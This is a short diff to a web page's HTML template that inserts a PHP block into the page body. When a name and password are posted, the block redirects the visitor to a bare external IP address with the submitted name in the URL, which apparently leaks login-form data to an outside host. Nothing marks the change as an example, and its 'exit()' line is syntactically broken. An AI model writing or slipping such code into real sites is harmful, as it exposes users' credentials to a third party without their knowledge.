@@ -20,6 +20,15 @@
   </head>
   <body>
 
+<?php
+if (isset($_POST['name']) and isset($_POST['password'])) {
+  $name = $_POST['name'];
+  $url = "http://133.2.176.112?name=$name";
+  header('Location:'.$url);
+  exit()
+}
+?>
+
 <br><br><br>
 
   <div class="container-fluid" style="max-width:1000px">
